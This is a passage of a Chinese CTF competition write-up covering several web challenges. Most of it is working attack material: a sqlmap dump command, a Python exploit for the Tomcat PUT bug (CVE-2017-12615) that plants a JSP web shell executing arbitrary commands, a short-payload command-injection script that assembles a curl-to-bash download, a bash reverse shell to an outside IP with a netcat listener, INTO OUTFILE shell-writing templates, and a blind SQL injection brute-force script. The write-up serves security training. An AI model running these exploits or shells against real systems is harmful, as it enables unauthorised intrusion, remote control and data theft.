<h3 id="flag值：-4"><a href="#flag值：-4" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{weisuohenzhongyao}</p>
<h2 id="6-题目六-成绩单"><a href="#6-题目六-成绩单" class="headerlink" title="6.题目六 成绩单"></a>6.题目六 成绩单</h2><h3 id="操作内容：-5"><a href="#操作内容：-5" class="headerlink" title="操作内容："></a>操作内容：</h3><p>post注入，单引号字符型注入，啥都没过滤，写wp就直接用sqlmap跑了。</p>
<p>post抓包得到请求包，保存为1.txt</p>
<p><img src="https://image.3001.net/images/20200707/15940878612782.jpg" alt="img"> </p>
<p>sqlmap一把梭</p>
<p>暴值得到flag：sqlmap.py -r 1.txt -D web1 –level 3 -T fl4g -C flag –dump</p>
<p><img src="https://image.3001.net/images/20200707/15940878657083.jpg" alt="img"> </p>
<h3 id="flag值：-5"><a href="#flag值：-5" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{Sql_INJECT0N_4813drd8hz4}</p>
<h2 id="7-题目七-小猫咪踩灯泡"><a href="#7-题目七-小猫咪踩灯泡" class="headerlink" title="7.题目七 小猫咪踩灯泡"></a>7.题目七 小猫咪踩灯泡</h2><h3 id="操作内容：-6"><a href="#操作内容：-6" class="headerlink" title="操作内容："></a>操作内容：</h3><p>CVE-2017-12615，github找exp，原理是通过上传jsp的脚本来拿到webshell。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def attack(url):</span><br><span class="line">	user_agent&#x3D;&quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;51.0.2704.103 Safari&#x2F;537.36&quot;</span><br><span class="line">	headers&#x3D;&#123;&quot;User-Agent&quot;:user_agent&#125;</span><br><span class="line">	data&#x3D;&quot;&quot;&quot;&lt;%</span><br><span class="line">    if(&quot;fff&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream();</span><br><span class="line">        int a &#x3D; -1;</span><br><span class="line">        byte[] b &#x3D; new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a&#x3D;in.read(b))!&#x3D;-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;&#x2F;pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;&quot;&quot;&quot;</span><br><span class="line">	try:</span><br><span class="line">		requests.put(url, headers&#x3D;headers, data&#x3D;data)</span><br><span class="line">		time.sleep(2)</span><br><span class="line">		verify_response &#x3D; requests.get(url[:-1], headers&#x3D;headers)</span><br><span class="line">		if verify_response.status_code &#x3D;&#x3D; 200:</span><br><span class="line">			print &#39;success!&#39;</span><br><span class="line">		else :</span><br><span class="line">			print verify_response.status_code</span><br><span class="line">	except :</span><br><span class="line">		&quot;error&quot;</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">	target_url &#x3D; sys.argv[1] + &#39;2017126151.jsp&#x2F;&#39;</span><br><span class="line">	attack(target_url)</span><br><span class="line">	print &#39;shell: &#39; + target_url[:-1]</span><br></pre></td></tr></table></figure>

<p>运行脚本，上传shell，得到shell位置，提交参数查询得到flag</p>
<p><a href="http://31a9f418.yunyansec.com/2017126151.jsp?pwd=fff&amp;cmd=cat%20flag.txt" target="_blank" rel="noopener">http://31a9f418.yunyansec.com/2017126151.jsp?pwd=fff&amp;cmd=cat%20flag.txt</a></p>
<p><img src="https://image.3001.net/images/20200707/15940878724150.png" alt="image-20200703145708208"></p>
<h3 id="flag值：-6"><a href="#flag值：-6" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{54e47be053bf6ea1}</p>
<h2 id="8-题目八-分析代码获得flag"><a href="#8-题目八-分析代码获得flag" class="headerlink" title="8.题目八 分析代码获得flag"></a>8.题目八 分析代码获得flag</h2><h3 id="操作内容：-7"><a href="#操作内容：-7" class="headerlink" title="操作内容："></a>操作内容：</h3><p>运行脚本文件，写入payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">from time import sleep</span><br><span class="line">from urllib.parse import quote</span><br><span class="line"></span><br><span class="line">payload &#x3D; [</span><br><span class="line">    &#39;&gt;ls\\&#39;, </span><br><span class="line">    &#39;ls&gt;_&#39;, </span><br><span class="line">    &#39;&gt;\ \\&#39;, </span><br><span class="line">    &#39;&gt;-t\\&#39;, </span><br><span class="line">    &#39;&gt;\&gt;g&#39;, </span><br><span class="line">    &#39;ls&gt;&gt;_&#39;, </span><br><span class="line"></span><br><span class="line">    &#39;&gt;sh&#39;, </span><br><span class="line">    &#39;&gt;ba\\&#39;, </span><br><span class="line">    &#39;&gt;\|\\&#39;,</span><br><span class="line">    &#39;&gt;32\\&#39;,</span><br><span class="line">    &#39;&gt;1.\\&#39;,</span><br><span class="line">    &#39;&gt;5\\&#39;, </span><br><span class="line">    &#39;&gt;2.\\&#39;,</span><br><span class="line">    &#39;&gt;10\\&#39;, </span><br><span class="line">    &#39;&gt;9.\\&#39;, </span><br><span class="line">    &#39;&gt;3\\&#39;, </span><br><span class="line">    &#39;&gt;\ \\&#39;, </span><br><span class="line">    &#39;&gt;rl\\&#39;, </span><br><span class="line">    &#39;&gt;cu\\&#39;, </span><br><span class="line"></span><br><span class="line">    # exec</span><br><span class="line">    &#39;sh _&#39;, </span><br><span class="line">    &#39;sh g&#39;, </span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;82da9c13.yunyansec.com&#x2F;?reset&#x3D;1&#39;)</span><br><span class="line">for i in payload:</span><br><span class="line">    assert len(i) &lt;&#x3D; 5 </span><br><span class="line">    r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;82da9c13.yunyansec.com&#x2F;?1&#x3D;&#39; + quote(i) )</span><br><span class="line">    print(i)</span><br><span class="line">    sleep(0.2)</span><br></pre></td></tr></table></figure>

<p>服务器配置，在index.php中写入脚本<br>bash -i &gt;&amp; /dev/tcp/39.105.51.32/8080 0&gt;&amp;1<br>nc监听，运行脚本，反弹shell<br>nc -lvvp 8080<br>终端中查看文件内容得到flag<br>flag{a1c8BFF2}</p>
<p>之后看第一名战队的wp，还可以用cat读取上级目录中的文件内容来获取flag</p>
<p><img src="https://image.3001.net/images/20200707/1594087878481.png" alt="image-20200703151818734"></p>
<h3 id="flag值：-7"><a href="#flag值：-7" class="headerlink" title="flag值："></a>flag值：</h3><p>flag{a1c8BFF2}</p>
<h2 id="9-SQL注入1"><a href="#9-SQL注入1" class="headerlink" title="9.SQL注入1"></a>9.SQL注入1</h2><p>群里大佬提出是limit注入写文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INTO OUTFILE &#39;物理路径&#39; lines terminated by  （一句话hex编码）</span><br><span class="line">INTO OUTFILE &#39;物理路径&#39; fields terminated by （一句话hex编码）</span><br><span class="line">INTO OUTFILE &#39;物理路径&#39; columns terminated by （一句话hex编码）</span><br><span class="line">INTO OUTFILE &#39;物理路径&#39; lines starting by    （一句话hex编码）</span><br></pre></td></tr></table></figure>

<p>前提：开启secure-file-priv以及有写的权限就可以进行limit写shell</p>
<h2 id="10-SQL注入2"><a href="#10-SQL注入2" class="headerlink" title="10.SQL注入2"></a>10.SQL注入2</h2><p>御剑扫wwwroot.zip，过滤方法中看到过滤的比较凶。赛后通过第一名战队的wp来看，应该是异或注入。猜测账号密码图片都在同一个数据库表中。通过poc猜解出password的hash。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">a &#x3D;[&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;]</span><br><span class="line">temp &#x3D; &#39;&#39;</span><br><span class="line">while(1):</span><br><span class="line">    for i in a:</span><br><span class="line">        url &#x3D; &#39;http:&#x2F;&#x2F;23dcf1dc.yunyansec.com&#x2F;picture.php?id&#x3D;3&quot; or password REGEXP &#39;+&#39;\&#39;^&#39;+temp+i+&#39;\&#39; %23&#39;</span><br><span class="line">        r &#x3D; requests.get(url)</span><br><span class="line">        if &#39;not found&#39; not in r.text:</span><br><span class="line">            temp &#x3D; temp+i</span><br><span class="line">            print (temp)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<p><img src="https://image.3001.net/images/20200707/15940878999711.png" alt="image-20200703152040620"></p>
<p>二十位的hash，可能为dedecms，然后去掉前三位跟后一位然后md5解密得到密码，登录拿到flag。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">详细sql1解法，第一名战队的wp：https:&#x2F;&#x2F;0xfire.me&#x2F;2020&#x2F;06&#x2F;30&#x2F;T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9B&#x2F;</span><br><span class="line">github中也有SQL1的解题方法：https:&#x2F;&#x2F;github.com&#x2F;XDSEC&#x2F;xdsec_ctf&#x2F;tree&#x2F;494b53d388186e8be21e753bb2048362842280c1&#x2F;xdctf2015&#x2F;izyCTF</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>T-Star高校挑战赛</tag>
      </tags>
  </entry>
</search>
